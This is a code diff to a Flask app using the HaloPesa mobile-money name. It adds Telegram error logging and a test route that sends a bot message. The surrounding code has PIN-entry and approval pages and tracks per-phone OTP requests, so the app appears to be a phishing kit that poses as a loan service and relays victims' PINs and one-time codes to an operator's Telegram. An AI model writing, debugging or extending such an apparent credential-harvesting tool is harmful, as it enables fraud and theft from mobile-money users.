@@ -61,6 +61,8 @@ def send_telegram(message, reply_markup=None):
             payload['reply_markup'] = reply_markup
         response = requests.post(f'{TELEGRAM_API}/sendMessage', json=payload)
         logging.info(f"Telegram send status: {response.status_code}")
+        if response.status_code != 200:
+            logging.error(f"Telegram response: {response.text}")
     except Exception as e:
         logging.error(f'Telegram error: {e}')
 
@@ -91,6 +93,15 @@ def pin_entry():
 def approve():
     return render_template('approve.html')
 
+@app.route('/test-telegram')
+def test_telegram():
+    """Test route to check Telegram integration."""
+    try:
+        send_telegram("🚀 Test message from HaloPesa! Your bot is working.")
+        return "Test message sent! Check your Telegram."
+    except Exception as e:
+        return f"Error: {e}"
+
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
     try:
@@ -109,7 +120,6 @@ def submit_loan():
         conn = sqlite3.connect('database.db')
         c = conn.cursor()
 
-        # OTP REQUESTED (for resend)
         if purpose == 'OTP REQUESTED':
             c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
             if c.fetchone()[0] >= 3:
